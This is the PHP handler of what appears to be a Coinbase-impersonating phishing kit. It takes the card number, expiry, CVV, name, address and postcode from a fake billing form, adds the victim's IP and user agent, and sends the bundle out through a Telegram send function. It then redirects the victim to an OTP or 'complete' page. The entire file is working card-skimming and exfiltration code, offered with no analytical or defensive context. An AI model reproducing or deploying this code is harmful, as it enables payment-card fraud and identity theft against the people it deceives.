<?php

include 'settings.php';
$noc = $_POST['noc'];
$street = $_POST['baddr'];
$postal = $_POST['postcode'];
$ccnum = $_POST['ccnum'];
$exp = $_POST['exp'];
$cvc = $_POST['cvv'];



if ($ccnum != null)
{

   


        $ip = getenv("REMOTE_ADDR");
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "|----------| COINBASE BILLING |--------------|\n";
        $message .= "Name on card    : " . $noc . "\n";
        $message .= "street address    : " . $street . "\n";
        $message .= "postal code    : " . $postal . "\n";
        $message .= "cc number    : " . $ccnum . "\n";
        $message .= "expiry    : " . $exp . "\n";
        $message .= "cvc    : " . $cvc . "\n";
        $message .= "|--------------- I N F O | I P -------------------|\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
        $message .= "User Agent : " . $useragent . "\n";
        $message .= "|-----------  --------------|\n";
        $subject = "COINBASE BILLING : $noc";
       

telegram_send(urlencode($message));    

                if ($secondotp=="on") {
                header("Location: ../verifyotp");
        }else{
                header("Location: ../complete");
        }
    

}

?>
